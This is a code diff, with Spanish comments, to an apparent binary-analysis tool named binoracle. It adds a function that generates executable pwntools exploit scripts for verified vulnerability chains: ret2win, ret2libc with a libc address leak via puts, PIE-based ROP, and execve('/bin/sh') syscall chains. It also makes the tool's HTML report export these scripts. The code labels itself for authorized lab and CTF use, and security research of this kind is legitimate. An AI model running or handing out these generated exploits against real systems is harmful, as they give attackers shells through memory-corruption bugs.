@@ -1125,6 +1125,71 @@ _XK_COL = {"vuln": "#e5484d", "primitive": "#f5a623", "control": "#4aa3ff",
            "gadget": "#12a594", "target": "#8e4ec6"}
 
 
+def _pwn_script(c) -> str:
+    """Script pwntools EJECUTABLE que reproduce la cadena verificada, anclado a la prueba concreta
+    (offset/win/base/estrategia). Para laboratorio autorizado. El usuario solo pone la ruta del
+    binario (y HOST:PORT si es remoto)."""
+    pr = getattr(c, "proof", None) or {}
+    off = pr.get("offset")
+    strat = (pr.get("strategy") or "").lower()
+    win = pr.get("win")
+    base = pr.get("base")
+    H = ["#!/usr/bin/env python3",
+         "# binoracle: exploit reproducible - SOLO laboratorio/CTF autorizado",
+         f"# cadena: {c.name} -> {c.target} | estrategia VERIFICADA: {strat}",
+         "from pwn import *",
+         "context.update(arch='amd64', os='linux')",
+         "BINARY = './target'   # <-- pon aqui la ruta a TU binario",
+         "elf = context.binary = ELF(BINARY, checksec=False)",
+         "io = process(BINARY)   # o: io = remote('HOST', PORT)"]
+    if off is None:
+        return "\n".join(H + ["# offset no resuelto durante la verificacion"])
+    if "ret2win" in strat:
+        body = [f"OFFSET = {off}",
+                "ret = next(elf.search(asm('ret'), executable=True), 0)  # alineacion de pila (16B)",
+                f"WIN = {win}",
+                "payload = flat({OFFSET: [ret, WIN]})",
+                "io.sendline(payload)",
+                "io.interactive()"]
+    elif "leak" in strat:                       # ret2libc con fuga de libc
+        body = [f"OFFSET = {off}",
+                "rop = ROP(elf)",
+                "rop.raw(rop.find_gadget(['ret']).address)",
+                "rop.puts(elf.got['puts']); rop.call(elf.sym['main'])  # fuga + reentrada",
+                "io.sendline(flat({OFFSET: rop.chain()}))",
+                "leak = u64(io.recvline().strip().ljust(8, b'\\x00'))",
+                "libc = elf.libc; libc.address = leak - libc.sym['puts']",
+                "rop2 = ROP(libc); rop2.system(next(libc.search(b'/bin/sh\\x00')))",
+                "io.sendline(flat({OFFSET: rop2.chain()}))",
+                "io.interactive()"]
+    elif "pie" in strat:
+        body = [f"OFFSET = {off}",
+                f"# PIE: base observada en el sandbox (ASLR off) = {base}",
+                "# con ASLR real necesitas un leak: elf.address = leak - offset_conocido",
+                f"elf.address = {base or 0}   # sandbox ASLR-off",
+                "binsh = next(elf.search(b'/bin/sh\\x00'), 0)",
+                "rop = ROP(elf)",
+                "sysaddr = (elf.plt.get('system') or elf.sym.get('system'))",
+                "rop.raw(rop.find_gadget(['ret']).address)",
+                "rop.call(sysaddr, [binsh]) if sysaddr else rop.execve(binsh, 0, 0)",
+                "io.sendline(b'A'*OFFSET + rop.chain())",
+                "io.interactive()"]
+    else:                                        # ret2libc-static / rop / execve (direcciones fijas)
+        body = [f"OFFSET = {off}",
+                "binsh = next(elf.search(b'/bin/sh\\x00'), 0)",
+                "rop = ROP(elf)",
+                "sysaddr = (elf.plt.get('system') or elf.sym.get('system'))",
+                "if sysaddr and binsh:",
+                "    rop.raw(rop.find_gadget(['ret']).address)",
+                "    rop.call(sysaddr, [binsh])                 # ret2libc system('/bin/sh')",
+                "else:",
+                "    rop.rax = 0x3b; rop.rdi = binsh; rop.rsi = 0; rop.rdx = 0",
+                "    rop.raw(rop.find_gadget(['syscall', 'ret']).address)  # execve('/bin/sh')",
+                "io.sendline(flat({OFFSET: rop.chain()}))",
+                "io.interactive()"]
+    return "\n".join(H + body)
+
+
 def _exploit_html(an, lang: str) -> str:
     """Exploit Chain Analyzer: grafo interactivo (Vulnerabilidad -> Primitiva -> Control -> Gadget...
     -> Objetivo) renderizado en servidor + interactividad (pan/zoom/arrastrar, inspeccionar nodo,
@@ -1219,12 +1284,15 @@ def _exploit_html(an, lang: str) -> str:
             return "<ul class='xgul'>" + "".join(f"<li>{_esc(x)}</li>" for x in items) + "</ul>" if items else "<span class='mut'>-</span>"
         gtxt = [hex(a) for a in c.gadgets_used] or []
         steps_txt = " -> ".join((s.label + (f"@{hex(s.addr)}" if s.addr else "")) for s in c.steps)
-        export = (f"# {c.name} | objetivo={c.target} | factible={c.feasible} | score={c.score}\n"
-                  f"# SOLO laboratorio autorizado. Representacion reproducible del plan.\n"
-                  f"cadena: {steps_txt}\n"
-                  + "\n".join("req: " + r for r in c.requirements)
-                  + ("\ngadgets: " + ", ".join(gtxt) if gtxt else ""))
         verified = getattr(c, "verified", False)
+        if verified:
+            export = _pwn_script(c)          # script pwntools ejecutable (cadena verificada)
+        else:
+            export = (f"# {c.name} | objetivo={c.target} | factible={c.feasible} | score={c.score}\n"
+                      f"# SOLO laboratorio autorizado. Representacion reproducible del plan.\n"
+                      f"cadena: {steps_txt}\n"
+                      + "\n".join("req: " + r for r in c.requirements)
+                      + ("\ngadgets: " + ", ".join(gtxt) if gtxt else ""))
         if verified:
             fe, fc = ("VERIFICADA" if es else "VERIFIED"), "#30a46c"
         else:
@@ -1260,7 +1328,7 @@ def _exploit_html(an, lang: str) -> str:
             f'<div><div class="xgh">{L[5]}</div>{_ul(c.break_points)}</div>'
             f'</div>'
             f'<div class="xgsim"><b>{L[6]}:</b> {_esc(c.sim_result)}</div>'
-            f'<details class="xgexp"><summary>{("Exportar (uso autorizado)" if es else "Export (authorized use)")}</summary>'
+            f'<details class="xgexp"><summary>{(("Exportar script pwntools" if verified else "Exportar plan") + " (uso autorizado)") if es else (("Export pwntools script" if verified else "Export plan") + " (authorized use)")}</summary>'
             f'<pre class="evpre">{_esc(export)}</pre></details>'
             f'</details>')
     T = {"hint": ("Arrastra el fondo para moverte, rueda para zoom. Pulsa un nodo para inspeccionar "
